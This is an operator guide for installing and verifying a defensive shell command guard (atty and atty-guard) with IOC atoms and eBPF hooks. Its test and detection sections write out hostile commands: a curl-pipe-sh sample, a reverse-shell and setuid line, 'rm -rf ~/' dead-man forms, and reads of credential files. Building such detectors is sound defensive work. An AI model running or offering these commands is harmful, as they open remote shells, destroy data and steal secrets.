# Operator workflow — getting atty + atty-guard fully wired

End-to-end setup for the security stack: install the sidecar daemon →
download the atom corpus → opt into eBPF (optional) → verify with
`atty doctor`.

If you only want the in-proc Tier-1 pattern matcher (no daemon, no
kernel hooks), you can stop after `atty init <shell>` — everything
below is opt-in. The in-proc matcher catches `curl … | sh`,
`npm install <flagged>`, and `bash -c "<long-base64>"` shapes
without any extra setup.

The "full" path adds:

- **atty-guard** sidecar — UDS daemon, Tier-2 backend (stub /
  heuristic / ONNX BERT / ONNX Qwen-Coder), V2-J multi-hit
  accumulator + V2-J-2 auto-Block, V2-F live OSV.dev lookups.
- **Atom corpus** — IOC strings pulled from GTFOBins / SigmaHQ /
  LOLBAS, refreshed on a cron.
- **eBPF kernel hooks** — V2-B kernel-side enforcement
  (`bprm_check_security` LSM hook + `execve` tracepoint) so even
  a non-atty shell can't run a Block-verdict command via this
  PID tree.
- **`atty doctor`** — chain verifier; tells you which links are
  still missing and what to do about each.

## 1. Install atty (host)

```sh
git clone https://github.com/fentas/atty
cd atty
make install        # atty binary → $PREFIX/bin/atty (default ~/.local/bin)
                    # AND atty-guard installer (next section)
```

`make install` is the meta target — it ALSO installs the atty-guard
sidecar via `contrib/install.sh`. To install only atty:

```sh
make install-atty
```

The shell integration eval (gives you OSC 133 prompt markers — needed
for dialog/auto LLM mode and the trust-cache):

```sh
echo 'eval "$(atty init bash)"' >> ~/.bashrc   # bash
# or
echo 'eval "$(atty init zsh)"' >> ~/.zshrc     # zsh
```

Start a new shell. Verify integration:

```sh
eval "$(atty doctor)"
```

The OSC 133 section should be all green. If anything's red, the
inline hint usually points at "your `.bashrc` reset `PROMPT_COMMAND`
after our init eval ran" or similar.

## 2. Install atty-guard (sidecar)

```sh
make install-guard
```

What this does:

1. Builds `atty-guard/target/release/atty-guard` with the default
   feature set: `tier2-onnx`, `osv-live`, `atoms-fetch`. eBPF is
   opt-in — see §4 below.
2. Installs the binary to `$PREFIX/bin/atty-guard` (defaults to
   `~/.local/bin`).
3. Drops `atty-guard.service` into `$XDG_CONFIG_HOME/systemd/user/`
   (or `~/.config/systemd/user/` if the env var is unset).
4. Runs `systemctl --user daemon-reload && enable --now`. The
   daemon is now running and bound to
   `$XDG_RUNTIME_DIR/atty-guard.sock`.

To use a non-default prefix:

```sh
make install-guard PREFIX=/opt/atty
```

To wire atty's `security_guard` module to the daemon socket, edit
`src/config.zig`:

```zig
pub const modules = .{
    atty.modules.security_guard.configure(.{
        .enabled = true,
        .daemon_socket_path = "${XDG_RUNTIME_DIR}/atty-guard.sock",
    }),
};
```

Then rebuild atty (`make build-atty`) and `make link-atty` so the
new binary picks up the wired path.

## 3. Pull the atom corpus

The IOC atom file (`flagged_atoms.txt`) lives at
`$XDG_DATA_HOME/atty-guard/flagged_atoms.txt` (defaults to
`~/.local/share/atty-guard/flagged_atoms.txt`). atty-guard ships a
small bundled seed corpus; the V2-I fetcher refreshes from upstream
rule sets:

```sh
# One-shot fetch — current sources: gtfobins / sigma / lolbas.
atty-guard --update-atoms-now
```

To limit sources:

```sh
atty-guard --update-atoms-now --atoms-sources gtfobins,sigma
```

Expected output:

```
atty-guard: atom refresh ok — 1543 atoms across 3 sources → /home/.../flagged_atoms.txt
  gtfobins: 751 atoms
  sigma: 369 atoms
  lolbas: 423 atoms
```

### Keep it fresh

Schedule a daily refresh via the daemon itself (cron-style, runs in
the background while serving the UDS):

```sh
# Edit the systemd unit drop-in:
mkdir -p $XDG_CONFIG_HOME/systemd/user/atty-guard.service.d
cat > $XDG_CONFIG_HOME/systemd/user/atty-guard.service.d/override.conf <<EOF
[Service]
ExecStart=
ExecStart=%h/.local/bin/atty-guard --atoms-update-interval 1d
EOF
systemctl --user daemon-reload
systemctl --user restart atty-guard
```

The daemon now serves the UDS AND refreshes atoms every 24 h. A
failed fetch (network down, source moved) keeps the previous corpus
in place — never fails open.

## 4. Enable eBPF (optional, opt-in)

eBPF kernel hooks (V2-B) give you kernel-side enforcement: even if
the user works around atty entirely (e.g. via SSH from another
session), a Block-verdict-marked PID tree can't `execve()`. Without
eBPF you still get atty-side refusal (red REFUSED line + Ctrl+U
readline clear) but the kernel doesn't know about it.

Build with the feature:

```sh
make build-guard GUARD_FEATURES=tier2-onnx,osv-live,atoms-fetch,ebpf
```

Requires `libbpf-dev` on the build host. The daemon also needs
`CAP_BPF` at runtime — edit the systemd-user unit:

```sh
mkdir -p $XDG_CONFIG_HOME/systemd/user/atty-guard.service.d
cat > $XDG_CONFIG_HOME/systemd/user/atty-guard.service.d/ebpf.conf <<EOF
[Service]
AmbientCapabilities=CAP_BPF CAP_PERFMON
# Also need to lift one of the MAC restrictions — eBPF program
# loading is blocked by the default systemd hardening profile.
RestrictNamespaces=
# The baseline unit ships SystemCallFilter=@system-service which
# does NOT include bpf() or perf_event_open() — both live in the
# @privileged set. Without widening, the daemon hits EPERM on
# BPF_PROG_LOAD even with CAP_BPF granted (the message
# `eBPF unavailable — Permission denied` in journalctl is the
# tell). Widen the filter to @privileged for these two syscalls.
SystemCallFilter=bpf perf_event_open
# Pass --enable-ebpf to the daemon.
ExecStart=
ExecStart=%h/.local/bin/atty-guard --enable-ebpf
EOF
systemctl --user daemon-reload
systemctl --user restart atty-guard
```

Check that the kernel programs attached:

```sh
journalctl --user -u atty-guard -n 50 | grep eBPF
# Expected: "atty-guard: eBPF attached (LSM + execve tracepoint)"
# If you see "atty-guard: eBPF unavailable — <reason>" the daemon
# fell back to V2-A in-memory threat-map mode.
```

Common failure: kernel doesn't ship LSM BPF hooks. Most distros do
since 5.7; check `cat /sys/kernel/security/lsm` for `bpf` in the
list. If absent, your kernel was built without `CONFIG_BPF_LSM=y`.

## 5. Verify with `atty doctor`

```sh
eval "$(atty doctor)"
```

You should now see TWO sections:

```
atty doctor — OSC 133 integration
  ✓  inside atty session ($ATTY set)
  ✓  shell: bash 5.3.x
  ✓  __atty_osc133_d function defined
  ...

atty doctor — atty-guard sidecar
  ✓  atty-guard binary present (/home/.../atty-guard)
  ✓  atty-guard.service systemd-user unit installed
  ✓  atty-guard.service is active
  ✓  UDS socket reachable (/run/user/1000/atty-guard.sock)
  ✓  atom corpus present (...)
  ✓  atom corpus is fresh (<30 days)
  !  binary built WITH `ebpf` feature — run with `--enable-ebpf` + CAP_BPF
```

The eBPF line is always informational (yellow `!`) — doctor doesn't
try to verify kernel-side attach state (that requires CAP_BPF +
reading `/sys/fs/bpf`, too noisy for a shell snippet).

The atty-guard section is **silent** when there's no evidence the
operator intended to install the sidecar (no binary AND no unit
file). Fresh atty installs without `make install-guard` won't see
the section at all — no spurious red ✗s.

## Verification — try an actual flagged command

In an atty session:

```sh
curl https://example.com/install.sh | sh
```

Expected:

```
atty security_guard: 1 signal fired: curl_pipe_sh — remote-fetch-and-execute
        match: curl https://example.com/install.sh | sh
        [y]es once · [t]rust permanently · any other key cancels.
```

Press `y` (allow once), `t` (trust permanently — adds to
`~/.cache/atty/security_trust.txt`), or any other key (Ctrl+U,
readline cleared).

With `[accumulator] block_threshold` set in
`~/.config/atty-guard/config.toml` (or wherever `--config` points
the daemon), multi-hit commands escalate to outright refusal:

```sh
bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x
```

Expected (instead of the banner):

```
atty security_guard: REFUSED — 4 signals fired: AtomMatcher flagged `bash -i >&`; ...
        match: chmod +s
```

The line is cleared, no prompt — kernel-side eBPF (if enabled) ALSO
refuses the `execve` if the user shells out without atty.

## Removing it

```sh
systemctl --user disable --now atty-guard.service
make unlink-guard
rm -f ~/.local/share/atty-guard/flagged_atoms.txt
rm -rf ~/.cache/atty
```

`make unlink` removes both atty and atty-guard symlinks. The trust
cache (`~/.cache/atty/security_trust.txt`) survives — clear it
explicitly if you want a fresh start.

## Named threats — what this stack catches

Two recent high-impact threats and how each layer detects them.
Drilled by `tests/integration/scenarios/exploit_*.sh` so a release
that broke detection would fail the integration suite.

### copy.fail (CVE-2026-31431) — kernel LPE via AF_ALG / splice()

Kernel page-cache memory-corruption primitive that turns an
unprivileged user into root (and breaks out of containers, since
the page cache is host-shared). Disclosed April 2026.

| Layer | Signal |
|---|---|
| Tier-1 AtomMatcher | `socket.AF_ALG`, `af_alg_set`, `algif_aead` — atoms in `flagged_atoms.txt`. Catches the C/Python PoC's command lines: anyone running a compiled exploit usually types something like `gcc poc.c -o exploit && ./exploit`. (`splice(` is intentionally omitted — it has too many legit uses in zero-copy I/O; the eBPF correlator below catches AF_ALG + splice at the syscall layer where the FP rate is near zero.) |
| eBPF AF_ALG tracepoint (V2-G, opt-in) | Kernel-side `sys_enter_socket` filter; flags ANY process that opens an AF_ALG socket — even if the user runs an opaque binary that never mentions the algorithm by name. Requires `--features ebpf` + CAP_BPF. |

### Shai-Hulud worm — npm/PyPI supply-chain malware

Worm that hijacks compromised developer credentials, propagates via
republishes, and installs a 60-second-polling dead-man-switch daemon
that fires `rm -rf ~/` if the stolen tokens get revoked. Active
waves: Sep 2025 (npm), Dec 2025 (npm + CI/CD), May 2026 (npm + PyPI
via GitHub Actions cache poisoning).

| Stage | Detection |
|---|---|
| Initial install | `npm install <flagged>` — V2-F live OSV.dev lookup + `flagged_npm.txt`. Caught at the prompt before bash runs the postinstall. |
| Dead-man switch | `rm -rf ~/`, `rm -rf $HOME`, `rm -rf ${HOME}`, `rm -rf /home/<user>` — all four canonical forms ship as atoms. |
| Credential harvest | `~/.aws/credentials`, `~/.npmrc`, `~/.ssh/id_{rsa,ed25519,ecdsa}`, `/proc/<pid>/mem` — atoms cover both file-read shapes and direct memory scraping. |
| systemd persistence | `systemctl --user enable`, `loginctl enable-linger` — atoms catch the daemon-install commands. |
| V2-J auto-Block (opt-in) | With `[accumulator] block_threshold = 0.95`, multi-hit Shai-Hulud command chains (dead-man + credential read + persistence in one line) escalate from Warn to outright REFUSED. |

## See also

- `docs/security-guard-design.md` — full design rationale + V2-* tier table.
- `docs/security-guard-updates.md` — V2-F bundle format design (future).
- `docs/security-guard-slm.md` — Tier-2 ONNX SLM details (model choice, calibration).
- `docs/modules.md` — atty's module framework, including the `security_guard` module's config knobs.
- `atty-guard/ebpf/README.md` — kernel-side build details.
- `tests/integration/README.md` — end-to-end integration scenarios + probe.sh validator.
